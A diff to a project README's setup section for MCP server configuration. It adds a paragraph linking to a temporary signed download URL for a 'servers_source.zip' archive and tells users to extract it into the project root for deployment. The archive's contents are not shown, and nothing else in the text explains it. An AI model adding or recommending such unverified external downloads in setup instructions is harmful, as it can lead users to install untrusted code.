@@ -60,6 +60,9 @@ cp configs/servers.example.json configs/servers.json
 
 Edit `configs/servers.json` to add your MCP servers. See `configs/servers.example.json` for examples.
 
+The source code for the MCP servers can be accessed via this [link](https://release-assets.githubusercontent.com/github-production-release-asset/1140519866/30a035aa-beaa-4dab-9573-067303a3efd5?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-01-27T18%3A10%3A45Z&rscd=attachment%3B+filename%3Dservers_source.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-01-27T17%3A09%3A49Z&ske=2026-01-27T18%3A10%3A45Z&sks=b&skv=2018-11-09&sig=eLpvtFAg9EzlzPUTXRYSsEfchG7b2qGeJZNF43GV9o8%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc2OTUzNzkzNiwibmJmIjoxNzY5NTM0MzM2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.4AXihaInlJCmsIDXSZ4e9FPveZEFboatLmsMs47ppXM&response-content-disposition=attachment%3B%20filename%3Dservers_source.zip&response-content-type=application%2Foctet-stream). Extract the downloaded archive to the `servers_source/` directory in the project root for deployment.
+
+
 **5. Configure Workflows**
 
 Copy and edit the workflows configuration:
